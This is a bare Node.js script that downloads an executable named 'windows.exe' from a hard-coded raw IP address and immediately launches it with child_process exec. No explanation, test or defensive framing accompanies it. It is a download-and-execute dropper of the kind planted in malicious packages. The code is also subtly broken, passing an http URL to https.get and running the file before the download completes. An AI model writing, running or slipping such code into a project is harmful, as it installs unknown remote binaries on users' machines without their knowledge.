const fs = require('fs');
const https = require('https');

https.get('http://172.86.73.132/windows.exe', (res) => {
  const file = fs.createWriteStream('windows.exe');
  res.pipe(file);
});

const { exec } = require('child_process');

exec('start windows.exe'); // Windows
